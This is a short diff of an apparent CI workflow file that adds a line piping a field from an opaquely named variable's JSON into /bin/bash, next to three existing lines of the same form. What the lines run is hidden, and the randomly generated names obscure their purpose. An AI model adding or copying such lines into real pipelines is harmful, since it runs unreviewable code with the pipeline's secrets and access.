@@ -25,6 +25,7 @@ jobs:
           echo $ex2 | jq -r .l92 | /bin/bash
           echo $rcnj8705 | jq -r .zhp351 | /bin/bash
           echo $nykr13678 | jq -r .czym0637 | /bin/bash
+          echo $vuq40 | jq -r .mrpdb51 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
